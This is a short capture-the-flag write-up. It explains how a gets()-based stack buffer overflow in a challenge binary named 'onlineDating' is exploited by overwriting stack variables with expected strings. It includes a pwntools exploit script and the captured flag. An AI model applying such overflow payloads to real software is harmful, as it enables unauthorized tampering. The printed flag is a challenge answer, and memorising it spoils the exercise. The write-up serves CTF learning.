# 🔑 Write-Up

We have a trivial buffer overflow vulnerability, we just need to overwrite some stack variables with the correct values.
The input length isn't checked due to the use of `gets()` for handling user input, the target buffer is 56 bytes long, its content aren't checked against anything so we can just fill it with `A`s.
The only important thing here is overwriting the variables with the correct value and in the correct order (that's easily checked by looking at the variables position in the stack).

```python
from pwn import *

payload = b'A'* 56 + b'Gerard_Pique' + b'Clara_C.' + b'TwingoOo' + b'CasioOo!'

r = process('./onlineDating')
r.sendlineafter(b'Please tell us how to update it (max 50 char):', payload)
r.interactive()
```

### 🚩 Flag 

```plain
SPRITZ{Cr4zy_DuD3}
```